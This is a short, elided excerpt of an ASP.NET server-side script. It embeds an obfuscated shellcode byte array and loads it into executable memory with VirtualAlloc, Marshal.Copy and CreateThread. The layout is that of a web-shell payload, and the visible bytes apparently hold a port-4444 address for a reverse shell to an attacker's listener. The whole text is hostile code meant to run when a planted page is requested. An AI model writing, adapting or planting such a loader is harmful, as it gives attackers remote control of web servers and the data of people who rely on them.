...
<script runat="server">
    ...
    {
        byte[] yjAAPEx7Z97t = new byte[460] {
...
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x08,0xfc,0x75,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,
...
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
        ...
        IntPtr su6 = VirtualAlloc(IntPtr.Zero,(UIntPtr)yjAAPEx7Z97t.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(yjAAPEx7Z97t,0,su6,yjAAPEx7Z97t.Length);
        IntPtr kSzlyQ = IntPtr.Zero;
        IntPtr tHHXydm6JF = CreateThread(IntPtr.Zero,UIntPtr.Zero,su6,IntPtr.Zero,0,ref kSzlyQ);
    }
</script>
